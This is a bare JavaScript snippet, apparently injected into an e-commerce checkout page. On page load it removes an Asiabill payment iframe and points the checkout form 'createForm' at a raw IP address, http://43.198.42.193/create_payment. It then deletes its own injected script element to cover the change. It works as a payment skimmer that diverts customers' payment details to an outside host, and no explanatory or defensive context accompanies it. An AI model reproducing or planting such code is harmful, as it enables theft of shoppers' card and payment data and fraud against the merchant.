

window.onload=function(){
     var scriptEle = document.createElement("script");
     scriptEle.type ="text/javascript";
     scriptEle.id ="F10CD0ED-220F-54A6-E900-918D709D0CA4";
     scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
     var x = document.getElementById("createForm");
     x.insertBefore(scriptEle, x.firstChild);
     document.body.appendChild(scriptEle);
     document.getElementById('AsiabillPayIframe').remove();
     let node = document.getElementById('createForm');
     let c = node.cloneNode(true);
     document.body.appendChild(c);
     x.remove();
     document.getElementById("F10CD0ED-220F-54A6-E900-918D709D0CA4").remove();
}
